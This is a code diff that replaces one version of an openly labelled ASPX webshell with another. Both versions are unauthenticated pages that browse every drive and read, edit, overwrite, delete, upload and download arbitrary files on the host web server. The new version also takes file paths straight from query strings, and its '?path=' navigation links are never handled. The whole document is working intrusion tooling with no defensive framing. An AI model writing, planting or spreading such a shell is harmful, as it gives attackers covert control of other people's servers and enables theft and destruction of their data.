@@ -1,226 +1,222 @@
 <%@ Page Language="C#" AutoEventWireup="true" %>
-<%@ Import Namespace="System.IO" %>
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Simple ASPX WebShell</title>
-    <style>
-        body { font-family: Arial; margin: 20px; }
-        table { border-collapse: collapse; width: 100%; }
-        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-        .error { color: red; }
-        .success { color: green; }
-    </style>
-</head>
+<head><title>ASPX Webshell</title></head>
 <body>
     <form runat="server">
-        <h2>ASPX WebShell</h2>
-        <asp:Label ID="lblMessage" runat="server" />
-        <br />
-        <asp:TextBox ID="txtPath" runat="server" Width="500px" />
-        <asp:Button ID="btnNavigate" runat="server" Text="Go" OnClick="btnNavigate_Click" />
-        <br /><br />
-        <asp:DropDownList ID="ddlDrives" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlDrives_SelectedIndexChanged" />
-        <br /><br />
-        <h3>Files and Directories</h3>
-        <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" OnRowCommand="gvFiles_RowCommand">
-            <Columns>
-                <asp:BoundField DataField="Name" HeaderText="Name" />
-                <asp:BoundField DataField="Type" HeaderText="Type" />
-                <asp:BoundField DataField="Size" HeaderText="Size" />
-                <asp:BoundField DataField="LastModified" HeaderText="Last Modified" />
-                <asp:TemplateField>
-                    <ItemTemplate>
-                        <asp:LinkButton ID="btnDownload" runat="server" Text="Download" CommandName="Download" CommandArgument='<%# Eval("FullPath") %>' Visible='<%# Eval("Type").ToString() == "File" %>' />
-                        <asp:LinkButton ID="btnDelete" runat="server" Text="Delete" CommandName="Delete" CommandArgument='<%# Eval("FullPath") %>' OnClientClick="return confirm('Are you sure you want to delete this?');" />
-                        <asp:LinkButton ID="btnRename" runat="server" Text="Rename" CommandName="Rename" CommandArgument='<%# Eval("FullPath") %>' />
-                        <asp:LinkButton ID="btnEdit" runat="server" Text="Edit" CommandName="Edit" CommandArgument='<%# Eval("FullPath") %>' Visible='<%# Eval("Type").ToString() == "File" %>' />
-                    </ItemTemplate>
-                </asp:TemplateField>
-            </Columns>
-        </asp:GridView>
-        <br />
-        <h3>Upload File</h3>
-        <asp:FileUpload ID="fileUpload" runat="server" />
-        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
-        <br /><br />
-        <h3>Edit File</h3>
-        <asp:TextBox ID="txtFileContent" runat="server" TextMode="MultiLine" Width="500px" Height="200px" Visible="false" />
-        <asp:Button ID="btnSave" runat="server" Text="Save" OnClick="btnSave_Click" Visible="false" />
-        <asp:HiddenField ID="hdnEditFilePath" runat="server" />
-    </form>
+        <asp:Label runat="server" ID="lblCurrentPath" Text=""></asp:Label><br />
 
-    <script runat="server">
-        protected void Page_Load(object sender, EventArgs e)
-        {
-            if (!IsPostBack)
+        <asp:DropDownList runat="server" ID="ddlDrives" AutoPostBack="true" OnSelectedIndexChanged="ddlDrives_SelectedIndexChanged"></asp:DropDownList><br />
+
+        <asp:TextBox runat="server" ID="txtPath" Width="600"></asp:TextBox>
+        <asp:Button runat="server" Text="Go" OnClick="BtnGo_Click" /><br />
+
+        <asp:Literal runat="server" ID="ltFiles" /><br />
+
+        <asp:FileUpload runat="server" ID="fuUpload" />
+        <asp:Button runat="server" Text="Upload" OnClick="BtnUpload_Click" /><br />
+
+        <asp:TextBox runat="server" ID="txtEditFileName" Width="600"></asp:TextBox><br />
+        <asp:TextBox runat="server" ID="txtEditFileContent" TextMode="MultiLine" Width="600" Height="300"></asp:TextBox><br />
+        <asp:Button runat="server" Text="Save File" OnClick="BtnSaveFile_Click" /><br />
+
+        <asp:Label runat="server" ID="lblMessage" ForeColor="Red" Text=""></asp:Label>
+
+        <script runat="server">
+            string currentPath = "";
+
+            protected void Page_Load(object sender, EventArgs e)
             {
-                PopulateDrives();
-                string currentDir = Server.MapPath("~");
-                txtPath.Text = currentDir;
-                LoadDirectory(currentDir);
+                if (!IsPostBack)
+                {
+                    LoadDrives();
+                    if (ddlDrives.Items.Count > 0)
+                    {
+                        ddlDrives.SelectedIndex = 0;
+                        currentPath = ddlDrives.SelectedValue;
+                        txtPath.Text = currentPath;
+                        ShowDirectory(currentPath);
+                    }
+                }
+                else
+                {
+                    currentPath = txtPath.Text;
+                }
+                lblCurrentPath.Text = "Current Path: " + currentPath;
+
+                // Handle query strings (edit, delete, download, rename)
+                if (!IsPostBack)
+                {
+                    if (Request.QueryString["edit"] != null)
+                    {
+                        string f = Request.QueryString["edit"];
+                        if (System.IO.File.Exists(f))
+                        {
+                            EditFile(f);
+                        }
+                    }
+                    else if (Request.QueryString["download"] != null)
+                    {
+                        string f = Request.QueryString["download"];
+                        if (System.IO.File.Exists(f))
+                        {
+                            Response.Clear();
+                            Response.ContentType = "application/octet-stream";
+                            Response.AddHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(f));
+                            Response.WriteFile(f);
+                            Response.End();
+                        }
+                    }
+                    else if (Request.QueryString["delete"] != null)
+                    {
+                        string f = Request.QueryString["delete"];
+                        if (System.IO.File.Exists(f))
+                        {
+                            System.IO.File.Delete(f);
+                            lblMessage.Text = "Deleted file: " + f;
+                            ShowDirectory(System.IO.Path.GetDirectoryName(f));
+                        }
+                    }
+                    else if (Request.QueryString["rename"] != null)
+                    {
+                        string f = Request.QueryString["rename"];
+                        if (System.IO.File.Exists(f))
+                        {
+                            EditFile(f);
+                            lblMessage.Text = "Rename by saving file with new name.";
+                        }
+                    }
+                }
             }
-        }
 
-        protected void PopulateDrives()
-        {
-            try
+            void LoadDrives()
             {
-                var drives = DriveInfo.GetDrives();
                 ddlDrives.Items.Clear();
-                foreach (var drive in drives)
+                foreach (var d in System.IO.DriveInfo.GetDrives())
                 {
-                    if (drive.IsReady)
-                        ddlDrives.Items.Add(drive.Name);
-                }
-            }
-            catch (Exception ex)
-            {
-                lblMessage.Text = "<span class='error'>Error loading drives: " + ex.Message + "</span>";
-            }
-        }
-
-        protected void btnNavigate_Click(object sender, EventArgs e)
-        {
-            string path = txtPath.Text;
-            if (Directory.Exists(path))
-                LoadDirectory(path);
-            else
-                lblMessage.Text = "<span class='error'>Invalid directory path</span>";
-        }
-
-        protected void ddlDrives_SelectedIndexChanged(object sender, EventArgs e)
-        {
-            string path = ddlDrives.SelectedValue;
-            txtPath.Text = path;
-            LoadDirectory(path);
-        }
-
-        protected void LoadDirectory(string path)
-        {
-            try
-            {
-                var items = new List<object>();
-                DirectoryInfo dirInfo = new DirectoryInfo(path);
-
-                foreach (var dir in dirInfo.GetDirectories())
-                {
-                    items.Add(new
+                    if (d.IsReady)
                     {
-                        Name = dir.Name,
-                        Type = "Directory",
-                        Size = "",
-                        LastModified = dir.LastWriteTime.ToString(),
-                        FullPath = dir.FullName
-                    });
-                }
-
-                foreach (var file in dirInfo.GetFiles())
-                {
-                    items.Add(new
-                    {
-                        Name = file.Name,
-                        Type = "File",
-                        Size = (file.Length / 1024) + " KB",
-                        LastModified = file.LastWriteTime.ToString(),
-                        FullPath = file.FullName
-                    });
-                }
-
-                gvFiles.DataSource = items;
-                gvFiles.DataBind();
-                txtPath.Text = path;
-            }
-            catch (Exception ex)
-            {
-                lblMessage.Text = "<span class='error'>Error: " + ex.Message + "</span>";
-            }
-        }
-
-        protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e)
-        {
-            string path = e.CommandArgument.ToString();
-            try
-            {
-                if (e.CommandName == "Download")
-                {
-                    FileInfo file = new FileInfo(path);
-                    if (file.Exists)
-                    {
-                        Response.Clear();
-                        Response.ContentType = "application/octet-stream";
-                        Response.AddHeader("Content-Disposition", "attachment; filename=" + file.Name);
-                        Response.TransmitFile(file.FullName);
-                        Response.End();
-                    }
-                }
-                else if (e.CommandName == "Delete")
-                {
-                    if (Directory.Exists(path))
-                        Directory.Delete(path, true);
-                    else if (File.Exists(path))
-                        File.Delete(path);
-                    lblMessage.Text = "<span class='success'>Deleted successfully</span>";
-                    LoadDirectory(txtPath.Text);
-                }
-                else if (e.CommandName == "Rename")
-                {
-                    // For simplicity, rename prompts for new name in textbox
-                    lblMessage.Text = "Enter new name in path box and click Rename again to confirm";
-                    txtPath.Text = path;
-                }
-                else if (e.CommandName == "Edit")
-                {
-                    if (File.Exists(path))
-                    {
-                        txtFileContent.Text = File.ReadAllText(path);
-                        txtFileContent.Visible = true;
-                        btnSave.Visible = true;
-                        hdnEditFilePath.Value = path;
+                        ddlDrives.Items.Add(d.Name);
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                lblMessage.Text = "<span class='error'>Error: " + ex.Message + "</span>";
-            }
-        }
 
-        protected void btnUpload_Click(object sender, EventArgs e)
-        {
-            try
+            protected void ddlDrives_SelectedIndexChanged(object sender, EventArgs e)
             {
-                if (fileUpload.HasFile)
+                currentPath = ddlDrives.SelectedValue;
+                txtPath.Text = currentPath;
+                ShowDirectory(currentPath);
+            }
+
+            protected void BtnGo_Click(object sender, EventArgs e)
+            {
+                currentPath = txtPath.Text;
+                if (System.IO.Directory.Exists(currentPath))
                 {
-                    string path = Path.Combine(txtPath.Text, fileUpload.FileName);
-                    fileUpload.SaveAs(path);
-                    lblMessage.Text = "<span class='success'>File uploaded successfully</span>";
-                    LoadDirectory(txtPath.Text);
+                    ShowDirectory(currentPath);
+                }
+                else if (System.IO.File.Exists(currentPath))
+                {
+                    EditFile(currentPath);
+                }
+                else
+                {
+                    lblMessage.Text = "Invalid path!";
                 }
             }
-            catch (Exception ex)
-            {
-                lblMessage.Text = "<span class='error'>Error uploading file: " + ex.Message + "</span>";
-            }
-        }
 
-        protected void btnSave_Click(object sender, EventArgs e)
-        {
-            try
+            void ShowDirectory(string path)
             {
-                string path = hdnEditFilePath.Value;
-                File.WriteAllText(path, txtFileContent.Text);
-                lblMessage.Text = "<span class='success'>File saved successfully</span>";
-                txtFileContent.Visible = false;
-                btnSave.Visible = false;
-                LoadDirectory(txtPath.Text);
+                try
+                {
+                    var dirs = System.IO.Directory.GetDirectories(path);
+                    var files = System.IO.Directory.GetFiles(path);
+                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
+
+                    if (path.Length > 3)
+                    {
+                        var parent = System.IO.Directory.GetParent(path);
+                        if (parent != null)
+                            sb.Append($"<a href='?path={parent.FullName}'>[Parent Directory]</a><br />");
+                    }
+
+                    sb.Append("<b>Directories:</b><br />");
+                    foreach (var d in dirs)
+                    {
+                        var dirName = System.IO.Path.GetFileName(d);
+                        sb.Append($"<a href='?path={d}'>{dirName}</a><br />");
+                    }
+
+                    sb.Append("<br /><b>Files:</b><br />");
+                    foreach (var f in files)
+                    {
+                        var fileName = System.IO.Path.GetFileName(f);
+                        sb.Append($"{fileName} - " +
+                            $"<a href='?edit={f}'>Edit</a> | " +
+                            $"<a href='?download={f}'>Download</a> | " +
+                            $"<a href='?delete={f}'>Delete</a> | " +
+                            $"<a href='?rename={f}'>Rename</a><br />");
+                    }
+                    ltFiles.Text = sb.ToString();
+                    lblMessage.Text = "";
+                }
+                catch (Exception ex)
+                {
+                    lblMessage.Text = "Error: " + ex.Message;
+                }
             }
-            catch (Exception ex)
+
+            void EditFile(string filePath)
             {
-                lblMessage.Text = "<span class='error'>Error saving file: " + ex.Message + "</span>";
+                try
+                {
+                    txtEditFileName.Text = filePath;
+                    txtEditFileContent.Text = System.IO.File.ReadAllText(filePath);
+                }
+                catch (Exception ex)
+                {
+                    lblMessage.Text = "Error reading file: " + ex.Message;
+                }
             }
-        }
+
+            protected void BtnSaveFile_Click(object sender, EventArgs e)
+            {
+                try
+                {
+                    var file = txtEditFileName.Text;
+                    System.IO.File.WriteAllText(file, txtEditFileContent.Text);
+                    lblMessage.Text = "File saved.";
+                    ShowDirectory(System.IO.Path.GetDirectoryName(file));
+                }
+                catch (Exception ex)
+                {
+                    lblMessage.Text = "Error saving file: " + ex.Message;
+                }
+            }
+
+            protected void BtnUpload_Click(object sender, EventArgs e)
+            {
+                if (fuUpload.HasFile)
+                {
+                    try
+                    {
+                        var targetPath = txtPath.Text;
+                        var fileName = System.IO.Path.Combine(targetPath, fuUpload.FileName);
+                        fuUpload.SaveAs(fileName);
+                        lblMessage.Text = "Uploaded: " + fuUpload.FileName;
+                        ShowDirectory(targetPath);
+                    }
+                    catch (Exception ex)
+                    {
+                        lblMessage.Text = "Upload failed: " + ex.Message;
+                    }
+                }
+                else
+                {
+                    lblMessage.Text = "No file selected for upload.";
+                }
+            }
+        </script>
     </form>
 </body>
 </html>
